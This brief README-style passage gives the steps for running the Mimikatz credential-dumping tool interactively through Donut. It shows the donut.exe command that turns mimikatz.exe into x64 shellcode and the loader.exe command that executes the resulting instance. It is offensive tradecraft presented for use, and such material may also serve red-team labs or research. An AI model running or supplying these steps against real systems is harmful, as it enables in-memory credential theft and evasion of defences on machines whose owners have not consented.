We will run Mimikatz interactively through Donut.

Use the debug and 64-bit versions of donut and loader that are in this directory.

Generate the shellcode and instance file:

```
.\donut.exe -f .\mimikatz_trunk\x64\mimikatz.exe -a 2
```


Run the instance through the loader.
```
.\loader.exe .\instance
```